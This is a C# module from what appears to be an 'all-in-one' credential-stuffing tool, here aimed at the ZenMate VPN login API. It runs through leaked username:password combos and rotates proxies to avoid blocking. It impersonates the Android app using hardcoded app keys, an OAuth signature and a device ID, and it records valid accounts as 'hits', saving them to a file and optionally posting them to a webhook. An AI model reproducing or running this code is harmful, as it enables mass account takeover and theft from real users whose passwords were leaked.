using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Zenmatemod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.IgnoreProtocolErrors = true;
                            req.KeepAlive = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("X-APP-KEY", " DgzQUrUj7YrarFjNvzNWlXyRQlRYK0nhmXCh");
                            req.AddHeader("X-MACHINE-ID", " 50d7d6a9511ddaa180f6b950264c52eb");
                            req.AddHeader("X-MACHINE-NAME", " SM-G950U1");
                            req.AddHeader("Authorization",
                                "OAuth oauth_version=\"1.0\", oauth_signature_method=\"PLAINTEXT\", oauth_consumer_key=\"DgzQUrUj7YrarFjNvzNWlXyRQlRYK0nhmXCh\", oauth_signature=\"ubvrWNQQTxOkncckVsIb3JjjlOAW9RQdFedq%26\"");
                            req.AddHeader("Host", " apiv1.zenguard.biz");
                            req.AddHeader("Connection", " close");
                            req.AddHeader("Accept-Encoding", " gzip, deflate");
                            req.UserAgent =
                                "ZM-And/5.0.2.272 (Android 5.1.1; SM-G950U1/dreamqlteue-user 5.1.1 NRD90M 500200516 release-keys/4.0.9+)";
                            var res = req
                                .Post(
                                    "https://apiv1.zenguard.biz/cg/oauth/access_token?os=android&cid=50d7d6a9511ddaa180f6b950264c52eb&osver=22&partnersId=2&version=5.0.2.272&lng=en&region=US&Country=US",
                                    "{\"import\":\"0\",\"x_auth_username\":\"" + array[0] +
                                    "\",\"x_auth_mode\":\"client_auth\",\"x_auth_machinename\":\"SM-G950U1\",\"reset\":\"0\",\"x_auth_machineid\":\"50d7d6a9511ddaa180f6b950264c52eb\",\"x_auth_password\":\"" +
                                    array[1] + "\"}", "application/json; charset=UTF-8").ToString();
                            if (res.Contains("USER NOT FOUND OR WRONG PASSWORD!"))
                            {
                                Program.Fails++;
                                Program.TotalChecks++;
                            }
                            else if (res.Contains("MAXIMUM ACTIVATIONS REACHED - RESET REQUIRED"))
                            {
                                Program.Hits++;
                                Program.TotalChecks++;
                                Export.AsResult("/Zenmate_hits", array[0] + ":" + array[1]);
                                if (Program.lorc == "LOG") Settings.PrintHit("Zenmate", array[0] + ":" + array[1]);
                                if (Settings.sendToWebhook)
                                    Settings.sendTowebhook1(array[0] + ":" + array[1], "Zenmate Hits");
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}